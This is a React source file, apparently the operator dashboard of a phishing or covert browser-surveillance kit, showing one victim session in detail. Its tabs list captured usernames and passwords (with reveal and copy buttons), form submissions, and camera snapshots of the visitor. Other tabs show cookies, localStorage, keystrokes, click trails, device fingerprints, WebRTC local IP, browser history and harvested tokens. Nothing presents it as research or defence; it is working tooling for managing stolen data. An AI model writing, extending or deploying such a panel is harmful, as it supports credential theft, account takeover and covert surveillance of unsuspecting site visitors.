import React, { useState, useEffect } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import { Box, Typography, Grid, Card, CardContent, Chip, Tabs, Tab, Table, TableBody, TableCell, TableContainer, TableHead, TableRow, Paper, IconButton, TextField, Button } from '@mui/material';
import ArrowBackIcon from '@mui/icons-material/ArrowBack';
import ContentCopyIcon from '@mui/icons-material/ContentCopy';
import VisibilityIcon from '@mui/icons-material/Visibility';
import VisibilityOffIcon from '@mui/icons-material/VisibilityOff';
import axios from 'axios';

const API_URL = process.env.REACT_APP_API_URL || 'http://localhost:5000';

function TabPanel({ children, value, index }) {
  return value === index ? <Box sx={{ py: 3 }}>{children}</Box> : null;
}

export default function SessionDetail() {
  const { id } = useParams();
  const navigate = useNavigate();
  const [session, setSession] = useState(null);
  const [tab, setTab] = useState(0);
  const [showPasswords, setShowPasswords] = useState({});
  const [notes, setNotes] = useState('');
  const [tags, setTags] = useState('');

  useEffect(() => {
    const fetch = async () => {
      try {
        const res = await axios.get(`${API_URL}/api/admin/sessions/${id}`);
        setSession(res.data);
        setNotes(res.data.notes || '');
        setTags((res.data.tags || []).join(', '));
      } catch(e) { console.error(e); }
    };
    fetch();
    const interval = setInterval(fetch, 10000);
    return () => clearInterval(interval);
  }, [id]);

  const saveNotes = async () => {
    await axios.put(`${API_URL}/api/admin/sessions/${id}/notes`, { notes });
  };

  const saveTags = async () => {
    await axios.put(`${API_URL}/api/admin/sessions/${id}/tags`, { tags: tags.split(',').map(t => t.trim()).filter(Boolean) });
  };

  const copyToClipboard = (text) => {
    navigator.clipboard.writeText(text);
  };

  if (!session) return <Typography sx={{ color: '#888' }}>Loading...</Typography>;

  const geo = session.geolocation || {};

  return (
    <Box>
      <Box sx={{ display: 'flex', alignItems: 'center', gap: 2, mb: 3 }}>
        <IconButton onClick={() => navigate('/admin/sessions')}><ArrowBackIcon sx={{ color: '#00f0ff' }} /></IconButton>
        <Typography variant="h5" sx={{ color: '#fff', fontWeight: 700, fontFamily: 'monospace' }}>{session.sessionId}</Typography>
        <Chip label={session.isOnline ? '🟢 Online' : '🔴 Offline'} size="small" sx={{ bgcolor: session.isOnline ? 'rgba(0,255,136,0.15)' : 'rgba(255,255,255,0.05)', color: session.isOnline ? '#00ff88' : '#666' }} />
        <Chip label={`Score: ${session.sessionScore || 0}`} size="small" sx={{ bgcolor: 'rgba(0,240,255,0.15)', color: '#00f0ff' }} />
      </Box>

      {/* Info Cards */}
      <Grid container spacing={2} sx={{ mb: 3 }}>
        <Grid item xs={12} sm={6} md={3}>
          <Card sx={{ bgcolor: '#111827', border: '1px solid rgba(255,255,255,0.05)' }}>
            <CardContent><Typography sx={{ color: '#888', fontSize: '0.8rem' }}>IP Address</Typography><Typography sx={{ color: '#fff', fontFamily: 'monospace' }}>{session.ipAddress || 'N/A'}</Typography></CardContent>
          </Card>
        </Grid>
        <Grid item xs={12} sm={6} md={3}>
          <Card sx={{ bgcolor: '#111827', border: '1px solid rgba(255,255,255,0.05)' }}>
            <CardContent><Typography sx={{ color: '#888', fontSize: '0.8rem' }}>Browser</Typography><Typography sx={{ color: '#fff' }}>{session.browser} {session.browserVersion}</Typography></CardContent>
          </Card>
        </Grid>
        <Grid item xs={12} sm={6} md={3}>
          <Card sx={{ bgcolor: '#111827', border: '1px solid rgba(255,255,255,0.05)' }}>
            <CardContent><Typography sx={{ color: '#888', fontSize: '0.8rem' }}>OS</Typography><Typography sx={{ color: '#fff' }}>{session.os} {session.osVersion}</Typography></CardContent>
          </Card>
        </Grid>
        <Grid item xs={12} sm={6} md={3}>
          <Card sx={{ bgcolor: '#111827', border: '1px solid rgba(255,255,255,0.05)' }}>
            <CardContent><Typography sx={{ color: '#888', fontSize: '0.8rem' }}>Device</Typography><Typography sx={{ color: '#fff' }}>{session.deviceType} {session.deviceVendor}</Typography></CardContent>
          </Card>
        </Grid>
        <Grid item xs={12} sm={6} md={3}>
          <Card sx={{ bgcolor: '#111827', border: '1px solid rgba(255,255,255,0.05)' }}>
            <CardContent><Typography sx={{ color: '#888', fontSize: '0.8rem' }}>Location</Typography><Typography sx={{ color: '#fff' }}>{[geo.city, geo.region, geo.country].filter(Boolean).join(', ') || 'Unknown'}</Typography></CardContent>
          </Card>
        </Grid>
        <Grid item xs={12} sm={6} md={3}>
          <Card sx={{ bgcolor: '#111827', border: '1px solid rgba(255,255,255,0.05)' }}>
            <CardContent><Typography sx={{ color: '#888', fontSize: '0.8rem' }}>Screen</Typography><Typography sx={{ color: '#fff' }}>{session.screenResolution || 'N/A'}</Typography></CardContent>
          </Card>
        </Grid>
        <Grid item xs={12} sm={6} md={3}>
          <Card sx={{ bgcolor: '#111827', border: '1px solid rgba(255,255,255,0.05)' }}>
            <CardContent><Typography sx={{ color: '#888', fontSize: '0.8rem' }}>Time on Site</Typography><Typography sx={{ color: '#fff' }}>{Math.floor((session.timeOnSite || 0) / 60)}m {(session.timeOnSite || 0) % 60}s</Typography></CardContent>
          </Card>
        </Grid>
        <Grid item xs={12} sm={6} md={3}>
          <Card sx={{ bgcolor: '#111827', border: '1px solid rgba(255,255,255,0.05)' }}>
            <CardContent><Typography sx={{ color: '#888', fontSize: '0.8rem' }}>Clicks</Typography><Typography sx={{ color: '#fff' }}>{session.clickCount || 0}</Typography></CardContent>
          </Card>
        </Grid>
      </Grid>

      <Card sx={{ bgcolor: '#111827', border: '1px solid rgba(255,255,255,0.05)', mb: 3 }}>
        <CardContent>
          <Box sx={{ display: 'flex', gap: 2, mb: 2 }}>
            <TextField fullWidth size="small" label="Notes" value={notes} onChange={(e) => setNotes(e.target.value)} sx={{ input: { color: '#fff' }, label: { color: '#888' } }} />
            <Button variant="outlined" onClick={saveNotes} sx={{ borderColor: '#00f0ff', color: '#00f0ff', whiteSpace: 'nowrap' }}>Save Notes</Button>
          </Box>
          <Box sx={{ display: 'flex', gap: 2 }}>
            <TextField fullWidth size="small" label="Tags (comma separated)" value={tags} onChange={(e) => setTags(e.target.value)} sx={{ input: { color: '#fff' }, label: { color: '#888' } }} />
            <Button variant="outlined" onClick={saveTags} sx={{ borderColor: '#00f0ff', color: '#00f0ff', whiteSpace: 'nowrap' }}>Save Tags</Button>
          </Box>
          {session.tags?.length > 0 && (
            <Box sx={{ mt: 2, display: 'flex', gap: 1 }}>
              {session.tags.map((tag, i) => <Chip key={i} label={tag} size="small" sx={{ bgcolor: 'rgba(0,240,255,0.15)', color: '#00f0ff' }} />)}
            </Box>
          )}
        </CardContent>
      </Card>

      {/* Tabs */}
      <Card sx={{ bgcolor: '#111827', border: '1px solid rgba(255,255,255,0.05)' }}>
        <Tabs value={tab} onChange={(e, v) => setTab(v)} sx={{ '& .MuiTab-root': { color: '#888', '&.Mui-selected': { color: '#00f0ff' } }, '& .MuiTabs-indicator': { bgcolor: '#00f0ff' } }}>
          <Tab label={`Credentials (${session.credentials?.length || 0})`} />
          <Tab label="Form Data" />
          <Tab label={`Camera (${session.cameraImages?.length || 0})`} />
          <Tab label="Storage & Cookies" />
          <Tab label="Fingerprint" />
          <Tab label="Behavior" />
          <Tab label="Network" />
          <Tab label={`History (${session.browserHistory?.length || 0})`} />
          <Tab label={`Sessions (${session.sessionHarvest?.length || 0})`} />
        </Tabs>

        {/* Credentials Tab */}
        <TabPanel value={tab} index={0}>
          {session.credentials?.length > 0 ? (
            <TableContainer>
              <Table size="small">
                <TableHead>
                  <TableRow><TableCell sx={{ color: '#888', borderColor: 'rgba(255,255,255,0.05)' }}>#</TableCell><TableCell sx={{ color: '#888', borderColor: 'rgba(255,255,255,0.05)' }}>Username/Email</TableCell><TableCell sx={{ color: '#888', borderColor: 'rgba(255,255,255,0.05)' }}>Password</TableCell><TableCell sx={{ color: '#888', borderColor: 'rgba(255,255,255,0.05)' }}>Source</TableCell><TableCell sx={{ color: '#888', borderColor: 'rgba(255,255,255,0.05)' }}>URL</TableCell><TableCell sx={{ color: '#888', borderColor: 'rgba(255,255,255,0.05)' }}>Strength</TableCell><TableCell sx={{ color: '#888', borderColor: 'rgba(255,255,255,0.05)' }}>Time</TableCell></TableRow>
                </TableHead>
                <TableBody>
                  {session.credentials.map((cred, i) => (
                    <TableRow key={cred._id}>
                      <TableCell sx={{ color: '#888', borderColor: 'rgba(255,255,255,0.05)' }}>{i + 1}</TableCell>
                      <TableCell sx={{ color: '#fff', borderColor: 'rgba(255,255,255,0.05)', fontFamily: 'monospace' }}>
                        {cred.username || cred.email || 'N/A'}
                        <IconButton size="small" onClick={() => copyToClipboard(cred.username || cred.email || '')}><ContentCopyIcon sx={{ fontSize: 14, color: '#888' }} /></IconButton>
                      </TableCell>
                      <TableCell sx={{ color: '#fff', borderColor: 'rgba(255,255,255,0.05)', fontFamily: 'monospace' }}>
                        {showPasswords[cred._id] ? cred.password : '••••••••'}
                        <IconButton size="small" onClick={() => setShowPasswords(prev => ({ ...prev, [cred._id]: !prev[cred._id] }))}>
                          {showPasswords[cred._id] ? <VisibilityOffIcon sx={{ fontSize: 14, color: '#888' }} /> : <VisibilityIcon sx={{ fontSize: 14, color: '#888' }} />}
                        </IconButton>
                        <IconButton size="small" onClick={() => copyToClipboard(cred.password || '')}><ContentCopyIcon sx={{ fontSize: 14, color: '#888' }} /></IconButton>
                      </TableCell>
                      <TableCell sx={{ borderColor: 'rgba(255,255,255,0.05)' }}><Chip label={cred.source} size="small" sx={{ color: '#ffaa00', borderColor: '#ffaa00' }} variant="outlined" /></TableCell>
                      <TableCell sx={{ color: '#aaa', borderColor: 'rgba(255,255,255,0.05)', fontSize: '0.75rem', maxWidth: 200, overflow: 'hidden', textOverflow: 'ellipsis' }}>{cred.url || 'N/A'}</TableCell>
                      <TableCell sx={{ borderColor: 'rgba(255,255,255,0.05)' }}>
                        <Chip label={cred.strength || 'unknown'} size="small" sx={{ bgcolor: cred.strength === 'weak' ? 'rgba(255,0,85,0.15)' : cred.strength === 'strong' ? 'rgba(0,255,136,0.15)' : 'rgba(255,170,0,0.15)', color: cred.strength === 'weak' ? '#ff0055' : cred.strength === 'strong' ? '#00ff88' : '#ffaa00' }} />
                      </TableCell>
                      <TableCell sx={{ color: '#888', borderColor: 'rgba(255,255,255,0.05)', fontSize: '0.75rem' }}>{new Date(cred.capturedAt).toLocaleString()}</TableCell>
                    </TableRow>
                  ))}
                </TableBody>
              </Table>
            </TableContainer>
          ) : <Typography sx={{ color: '#888', p: 3 }}>No credentials captured from this session.</Typography>}
        </TabPanel>

        {/* Form Data Tab */}
        <TabPanel value={tab} index={1}>
          {session.formData?.length > 0 ? session.formData.map((fd, i) => (
            <Card key={i} sx={{ bgcolor: 'rgba(255,255,255,0.02)', mb: 2, border: '1px solid rgba(255,255,255,0.05)' }}>
              <CardContent>
                <Typography sx={{ color: '#888', fontSize: '0.8rem', mb: 1 }}>Form ID: {fd.formId || 'unnamed'} | URL: {fd.url} | {new Date(fd.t).toLocaleString()}</Typography>
                <Box sx={{ display: 'flex', flexWrap: 'wrap', gap: 1 }}>
                  {Object.entries(fd.fields || {}).map(([key, value]) => (
                    <Chip key={key} label={`${key}: ${value}`} size="small" sx={{ bgcolor: 'rgba(0,240,255,0.1)', color: '#00f0ff', fontFamily: 'monospace', fontSize: '0.75rem' }} />
                  ))}
                </Box>
              </CardContent>
            </Card>
          )) : <Typography sx={{ color: '#888', p: 3 }}>No form data captured.</Typography>}
        </TabPanel>

        {/* Camera Tab */}
        <TabPanel value={tab} index={2}>
          {session.cameraImages?.length > 0 ? (
            <Grid container spacing={2}>
                  {session.cameraImages.map((img) => (
                    <Grid item xs={12} sm={6} md={4} key={img._id}>
                      <Card sx={{ bgcolor: 'rgba(255,255,255,0.02)', border: '1px solid rgba(255,255,255,0.05)' }}>
                        <CardContent>
                          <Box sx={{ width: '100%', height: 200, bgcolor: '#000', borderRadius: 1, overflow: 'hidden', mb: 1 }}>
                            {(img.cloudinaryUrl || img.imageData) ? <img src={img.cloudinaryUrl || img.imageData} alt="capture" style={{ width: '100%', height: '100%', objectFit: 'cover' }} /> : <Typography sx={{ color: '#666', p: 2 }}>No preview</Typography>}
                          </Box>
                          <Typography sx={{ color: '#888', fontSize: '0.75rem' }}>{new Date(img.capturedAt).toLocaleString()}</Typography>
                          <Typography sx={{ color: '#888', fontSize: '0.75rem' }}>Trigger: {img.triggerType}</Typography>
                          {img.cloudinaryUrl && (
                            <Typography sx={{ color: '#00f0ff', fontSize: '0.7rem', mt: 0.5 }}>
                              ☁️ Cloudinary
                            </Typography>
                          )}
                        </CardContent>
                      </Card>
                    </Grid>
                  ))}
            </Grid>
          ) : <Typography sx={{ color: '#888', p: 3 }}>No camera captures. Camera access: {session.cameraAccessGranted ? '✅ Granted' : '❌ Not granted'}</Typography>}
        </TabPanel>

        {/* Storage Tab */}
        <TabPanel value={tab} index={3}>
          <Typography variant="h6" sx={{ color: '#fff', mb: 2 }}>localStorage ({session.localStorage?.length || 0} items)</Typography>
          {session.localStorage?.length > 0 ? (
            <TableContainer sx={{ mb: 3 }}>
              <Table size="small">
                <TableHead><TableRow><TableCell sx={{ color: '#888', borderColor: 'rgba(255,255,255,0.05)' }}>Key</TableCell><TableCell sx={{ color: '#888', borderColor: 'rgba(255,255,255,0.05)' }}>Value</TableCell></TableRow></TableHead>
                <TableBody>
                  {session.localStorage.map((item, i) => (
                    <TableRow key={i}><TableCell sx={{ color: '#aaa', borderColor: 'rgba(255,255,255,0.05)', fontFamily: 'monospace', fontSize: '0.8rem' }}>{item.key}</TableCell><TableCell sx={{ color: '#aaa', borderColor: 'rgba(255,255,255,0.05)', fontFamily: 'monospace', fontSize: '0.8rem', maxWidth: 400, overflow: 'hidden', textOverflow: 'ellipsis' }}>{item.value}</TableCell></TableRow>
                  ))}
                </TableBody>
              </Table>
            </TableContainer>
          ) : <Typography sx={{ color: '#888', mb: 2 }}>No localStorage data.</Typography>}

          <Typography variant="h6" sx={{ color: '#fff', mb: 2 }}>Cookies ({session.cookies?.length || 0})</Typography>
          {session.cookies?.length > 0 ? (
            <TableContainer>
              <Table size="small">
                <TableHead><TableRow><TableCell sx={{ color: '#888', borderColor: 'rgba(255,255,255,0.05)' }}>Name</TableCell><TableCell sx={{ color: '#888', borderColor: 'rgba(255,255,255,0.05)' }}>Value</TableCell><TableCell sx={{ color: '#888', borderColor: 'rgba(255,255,255,0.05)' }}>Domain</TableCell></TableRow></TableHead>
                <TableBody>
                  {session.cookies.map((c, i) => (
                    <TableRow key={i}><TableCell sx={{ color: '#aaa', borderColor: 'rgba(255,255,255,0.05)', fontFamily: 'monospace' }}>{c.name}</TableCell><TableCell sx={{ color: '#aaa', borderColor: 'rgba(255,255,255,0.05)', fontFamily: 'monospace', maxWidth: 300, overflow: 'hidden', textOverflow: 'ellipsis' }}>{c.value}</TableCell><TableCell sx={{ color: '#aaa', borderColor: 'rgba(255,255,255,0.05)' }}>{c.domain}</TableCell></TableRow>
                  ))}
                </TableBody>
              </Table>
            </TableContainer>
          ) : <Typography sx={{ color: '#888' }}>No cookies captured.</Typography>}
        </TabPanel>

        {/* Fingerprint Tab */}
        <TabPanel value={tab} index={4}>
          <Grid container spacing={2}>
            <Grid item xs={12} sm={6}>
              <Card sx={{ bgcolor: 'rgba(255,255,255,0.02)', border: '1px solid rgba(255,255,255,0.05)' }}>
                <CardContent>
                  <Typography sx={{ color: '#00f0ff', fontWeight: 600, mb: 2 }}>Canvas Fingerprint</Typography>
                  <Typography sx={{ color: '#aaa', fontFamily: 'monospace', fontSize: '0.8rem', wordBreak: 'break-all' }}>{session.canvasFingerprint || 'N/A'}</Typography>
                </CardContent>
              </Card>
            </Grid>
            <Grid item xs={12} sm={6}>
              <Card sx={{ bgcolor: 'rgba(255,255,255,0.02)', border: '1px solid rgba(255,255,255,0.05)' }}>
                <CardContent>
                  <Typography sx={{ color: '#00f0ff', fontWeight: 600, mb: 2 }}>WebGL Fingerprint</Typography>
                  <Typography sx={{ color: '#aaa', fontFamily: 'monospace', fontSize: '0.8rem', wordBreak: 'break-all' }}>{session.webglFingerprint || 'N/A'}</Typography>
                </CardContent>
              </Card>
            </Grid>
            <Grid item xs={12} sm={6}>
              <Card sx={{ bgcolor: 'rgba(255,255,255,0.02)', border: '1px solid rgba(255,255,255,0.05)' }}>
                <CardContent>
                  <Typography sx={{ color: '#00f0ff', fontWeight: 600, mb: 2 }}>Audio Fingerprint</Typography>
                  <Typography sx={{ color: '#aaa', fontFamily: 'monospace', fontSize: '0.8rem' }}>{session.audioFingerprint || 'N/A'}</Typography>
                </CardContent>
              </Card>
            </Grid>
            <Grid item xs={12} sm={6}>
              <Card sx={{ bgcolor: 'rgba(255,255,255,0.02)', border: '1px solid rgba(255,255,255,0.05)' }}>
                <CardContent>
                  <Typography sx={{ color: '#00f0ff', fontWeight: 600, mb: 2 }}>Hardware</Typography>
                  <Typography sx={{ color: '#aaa', fontSize: '0.85rem' }}>CPU Cores: {session.hardwareInfo?.cores || 'N/A'}</Typography>
                  <Typography sx={{ color: '#aaa', fontSize: '0.85rem' }}>Memory: {session.hardwareInfo?.memory ? `${session.hardwareInfo.memory}GB` : 'N/A'}</Typography>
                  <Typography sx={{ color: '#aaa', fontSize: '0.85rem' }}>Touch: {session.hardwareInfo?.touchSupport ? 'Yes' : 'No'}</Typography>
                  <Typography sx={{ color: '#aaa', fontSize: '0.85rem' }}>GPU: {session.hardwareInfo?.gpuVendor || 'N/A'} {session.hardwareInfo?.gpuRenderer || ''}</Typography>
                </CardContent>
              </Card>
            </Grid>
            <Grid item xs={12}>
              <Card sx={{ bgcolor: 'rgba(255,255,255,0.02)', border: '1px solid rgba(255,255,255,0.05)' }}>
                <CardContent>
                  <Typography sx={{ color: '#00f0ff', fontWeight: 600, mb: 2 }}>Installed Fonts ({session.installedFonts?.length || 0})</Typography>
                  <Box sx={{ display: 'flex', flexWrap: 'wrap', gap: 0.5 }}>
                    {(session.installedFonts || []).map((font, i) => <Chip key={i} label={font} size="small" sx={{ bgcolor: 'rgba(255,255,255,0.05)', color: '#aaa', fontSize: '0.7rem' }} />)}
                  </Box>
                </CardContent>
              </Card>
            </Grid>
          </Grid>
        </TabPanel>

        {/* Behavior Tab */}
        <TabPanel value={tab} index={5}>
          <Typography sx={{ color: '#888', mb: 2 }}>Click Events: {session.clickEvents?.length || 0} recorded</Typography>
          {session.clickEvents?.length > 0 ? (
            <TableContainer>
              <Table size="small">
                <TableHead><TableRow><TableCell sx={{ color: '#888', borderColor: 'rgba(255,255,255,0.05)' }}>#</TableCell><TableCell sx={{ color: '#888', borderColor: 'rgba(255,255,255,0.05)' }}>Position</TableCell><TableCell sx={{ color: '#888', borderColor: 'rgba(255,255,255,0.05)' }}>Target</TableCell><TableCell sx={{ color: '#888', borderColor: 'rgba(255,255,255,0.05)' }}>Page</TableCell><TableCell sx={{ color: '#888', borderColor: 'rgba(255,255,255,0.05)' }}>Time</TableCell></TableRow></TableHead>
                <TableBody>
                  {session.clickEvents.slice(0, 100).map((click, i) => (
                    <TableRow key={i}><TableCell sx={{ color: '#888', borderColor: 'rgba(255,255,255,0.05)' }}>{i + 1}</TableCell><TableCell sx={{ color: '#aaa', borderColor: 'rgba(255,255,255,0.05)', fontFamily: 'monospace' }}>({click.x}, {click.y})</TableCell><TableCell sx={{ color: '#aaa', borderColor: 'rgba(255,255,255,0.05)', fontSize: '0.75rem', maxWidth: 200, overflow: 'hidden', textOverflow: 'ellipsis' }}>{click.targetElement?.selector || click.targetElement?.tag || 'N/A'}</TableCell><TableCell sx={{ color: '#aaa', borderColor: 'rgba(255,255,255,0.05)', fontSize: '0.7rem', maxWidth: 150, overflow: 'hidden', textOverflow: 'ellipsis' }}>{click.pageUrl}</TableCell><TableCell sx={{ color: '#888', borderColor: 'rgba(255,255,255,0.05)', fontSize: '0.75rem' }}>{new Date(click.timestamp).toLocaleTimeString()}</TableCell></TableRow>
                  ))}
                </TableBody>
              </Table>
            </TableContainer>
          ) : <Typography sx={{ color: '#888' }}>No click events recorded.</Typography>}

          {session.keystrokes?.length > 0 && (
            <Box sx={{ mt: 3 }}>
              <Typography sx={{ color: '#fff', fontWeight: 600, mb: 1 }}>Keystrokes ({session.keystrokes.length})</Typography>
              <Card sx={{ bgcolor: 'rgba(255,255,255,0.02)', border: '1px solid rgba(255,255,255,0.05)', p: 2, maxHeight: 200, overflow: 'auto' }}>
                <Typography sx={{ color: '#aaa', fontFamily: 'monospace', fontSize: '0.8rem', whiteSpace: 'pre-wrap' }}>
                  {session.keystrokes.slice(0, 200).map(k => k.key).join(' ')}
                </Typography>
              </Card>
            </Box>
          )}
        </TabPanel>

        {/* Network Tab */}
        <TabPanel value={tab} index={6}>
          <Grid container spacing={2}>
            <Grid item xs={12} sm={6}>
              <Card sx={{ bgcolor: 'rgba(255,255,255,0.02)', border: '1px solid rgba(255,255,255,0.05)' }}>
                <CardContent>
                  <Typography sx={{ color: '#888', fontSize: '0.8rem' }}>Local IP</Typography>
                  <Typography sx={{ color: '#fff', fontFamily: 'monospace' }}>{session.networkInfo?.localIp || session.webRtcIp || 'N/A'}</Typography>
                </CardContent>
              </Card>
            </Grid>
            <Grid item xs={12} sm={6}>
              <Card sx={{ bgcolor: 'rgba(255,255,255,0.02)', border: '1px solid rgba(255,255,255,0.05)' }}>
                <CardContent>
                  <Typography sx={{ color: '#888', fontSize: '0.8rem' }}>Connection</Typography>
                  <Typography sx={{ color: '#fff' }}>{session.networkInfo?.effectiveType || 'N/A'} (RTT: {session.networkInfo?.rtt || 'N/A'}ms)</Typography>
                </CardContent>
              </Card>
            </Grid>
          </Grid>
        </TabPanel>

        {/* Browser History Tab */}
        <TabPanel value={tab} index={7}>
          {session.browserHistory?.length > 0 ? (
            <Box>
              <Typography sx={{ color: '#888', mb: 2 }}>
                {session.browserHistory.length} history items collected via {[...new Set(session.browserHistory.map(h => h.source))].join(', ')}
              </Typography>
              <TableContainer sx={{ maxHeight: 500, overflow: 'auto' }}>
                <Table size="small" stickyHeader>
                  <TableHead>
                    <TableRow>
                      <TableCell sx={{ color: '#888', borderColor: 'rgba(255,255,255,0.05)', bgcolor: '#111827' }}>#</TableCell>
                      <TableCell sx={{ color: '#888', borderColor: 'rgba(255,255,255,0.05)', bgcolor: '#111827' }}>Source</TableCell>
                      <TableCell sx={{ color: '#888', borderColor: 'rgba(255,255,255,0.05)', bgcolor: '#111827' }}>Key/Name</TableCell>
                      <TableCell sx={{ color: '#888', borderColor: 'rgba(255,255,255,0.05)', bgcolor: '#111827' }}>Value/URL</TableCell>
                      <TableCell sx={{ color: '#888', borderColor: 'rgba(255,255,255,0.05)', bgcolor: '#111827' }}>Time</TableCell>
                    </TableRow>
                  </TableHead>
                  <TableBody>
                    {session.browserHistory.map((item, i) => (
                      <TableRow key={i}>
                        <TableCell sx={{ color: '#888', borderColor: 'rgba(255,255,255,0.05)' }}>{i + 1}</TableCell>
                        <TableCell sx={{ borderColor: 'rgba(255,255,255,0.05)' }}>
                          <Chip label={item.source || 'unknown'} size="small" sx={{ color: '#ffaa00', borderColor: '#ffaa00', fontSize: '0.65rem' }} variant="outlined" />
                        </TableCell>
                        <TableCell sx={{ color: '#aaa', borderColor: 'rgba(255,255,255,0.05)', fontFamily: 'monospace', fontSize: '0.75rem', maxWidth: 150, overflow: 'hidden', textOverflow: 'ellipsis' }}>
                          {item.key || item.name || item.autocomplete || '-'}
                        </TableCell>
                        <TableCell sx={{ color: '#aaa', borderColor: 'rgba(255,255,255,0.05)', fontFamily: 'monospace', fontSize: '0.75rem', maxWidth: 300, overflow: 'hidden', textOverflow: 'ellipsis' }}>
                          {typeof item.value === 'string' ? item.value : item.origin || item.url || item.visitedSites?.join(', ') || JSON.stringify(item).substring(0, 200)}
                        </TableCell>
                        <TableCell sx={{ color: '#888', borderColor: 'rgba(255,255,255,0.05)', fontSize: '0.7rem' }}>
                          {item.timestamp ? new Date(item.timestamp).toLocaleString() : '-'}
                        </TableCell>
                      </TableRow>
                    ))}
                  </TableBody>
                </Table>
              </TableContainer>

              {/* Summary chips */}
              <Box sx={{ mt: 2, display: 'flex', flexWrap: 'wrap', gap: 1 }}>
                <Chip label={`📊 ${session.browserHistory.length} total items`} size="small" sx={{ bgcolor: 'rgba(0,240,255,0.08)', color: '#00f0ff' }} />
                {[...new Set(session.browserHistory.map(h => h.source))].slice(0, 10).map(s => (
                  <Chip key={s} label={s} size="small" sx={{ bgcolor: 'rgba(255,170,0,0.1)', color: '#ffaa00', fontSize: '0.65rem' }} />
                ))}
              </Box>
            </Box>
          ) : <Typography sx={{ color: '#888', p: 3 }}>No browser history data collected from this session.</Typography>}
        </TabPanel>

        {/* Session Harvest Tab */}
        <TabPanel value={tab} index={8}>
          {session.sessionHarvest?.length > 0 ? (
            <Box>
              <Box sx={{ display: 'flex', flexWrap: 'wrap', gap: 1, mb: 2 }}>
                <Chip label={`📦 ${session.sessionHarvest.length} items`} size="small" sx={{ bgcolor: 'rgba(0,240,255,0.08)', color: '#00f0ff' }} />
                <Chip label={`🔴 ${session.sessionHarvestSummary?.sensitiveItems || 0} sensitive`} size="small" sx={{ bgcolor: 'rgba(255,0,85,0.1)', color: '#ff0055' }} />
                {session.sessionHarvestSummary?.hasCredentials && (
                  <Chip label="🔑 Has passwords" size="small" sx={{ bgcolor: 'rgba(255,0,85,0.15)', color: '#ff0055', fontWeight: 600 }} />
                )}
                {session.sessionHarvestSummary?.hasTokens && (
                  <Chip label="🪙 Has tokens" size="small" sx={{ bgcolor: 'rgba(255,170,0,0.15)', color: '#ffaa00', fontWeight: 600 }} />
                )}
              </Box>

              <TableContainer sx={{ maxHeight: 500, overflow: 'auto' }}>
                <Table size="small" stickyHeader>
                  <TableHead>
                    <TableRow>
                      <TableCell sx={{ color: '#888', borderColor: 'rgba(255,255,255,0.05)', bgcolor: '#111827' }}>#</TableCell>
                      <TableCell sx={{ color: '#888', borderColor: 'rgba(255,255,255,0.05)', bgcolor: '#111827' }}>Source</TableCell>
                      <TableCell sx={{ color: '#888', borderColor: 'rgba(255,255,255,0.05)', bgcolor: '#111827' }}>Key</TableCell>
                      <TableCell sx={{ color: '#888', borderColor: 'rgba(255,255,255,0.05)', bgcolor: '#111827' }}>Value</TableCell>
                      <TableCell sx={{ color: '#888', borderColor: 'rgba(255,255,255,0.05)', bgcolor: '#111827' }}>Sensitive</TableCell>
                    </TableRow>
                  </TableHead>
                  <TableBody>
                    {session.sessionHarvest.map((item, i) => (
                      <TableRow key={i} sx={{ bgcolor: item.sensitive ? 'rgba(255,0,85,0.03)' : 'transparent' }}>
                        <TableCell sx={{ color: '#888', borderColor: 'rgba(255,255,255,0.05)' }}>{i + 1}</TableCell>
                        <TableCell sx={{ borderColor: 'rgba(255,255,255,0.05)' }}>
                          <Chip label={item.source || 'unknown'} size="small" sx={{ color: '#00f0ff', borderColor: '#00f0ff', fontSize: '0.65rem' }} variant="outlined" />
                        </TableCell>
                        <TableCell sx={{ color: '#ddd', borderColor: 'rgba(255,255,255,0.05)', fontFamily: 'monospace', fontSize: '0.75rem', maxWidth: 200, overflow: 'hidden', textOverflow: 'ellipsis', fontWeight: item.sensitive ? 700 : 400 }}>
                          {item.key || '-'}
                        </TableCell>
                        <TableCell sx={{ color: '#aaa', borderColor: 'rgba(255,255,255,0.05)', fontFamily: 'monospace', fontSize: '0.75rem', maxWidth: 400, overflow: 'hidden', textOverflow: 'ellipsis' }}>
                          {item.sensitive ? '🔴 REDACTED' : (typeof item.value === 'string' ? item.value : JSON.stringify(item.value).substring(0, 300))}
                        </TableCell>
                        <TableCell sx={{ borderColor: 'rgba(255,255,255,0.05)' }}>
                          {item.sensitive
                            ? <Chip label="SENSITIVE" size="small" sx={{ bgcolor: 'rgba(255,0,85,0.2)', color: '#ff0055', fontSize: '0.6rem', height: 18 }} />
                            : <Typography sx={{ color: '#555', fontSize: '0.7rem' }}>No</Typography>
                          }
                        </TableCell>
                      </TableRow>
                    ))}
                  </TableBody>
                </Table>
              </TableContainer>
            </Box>
          ) : <Typography sx={{ color: '#888', p: 3 }}>No session harvest data collected from this session.</Typography>}
        </TabPanel>
      </Card>
    </Box>
  );
}
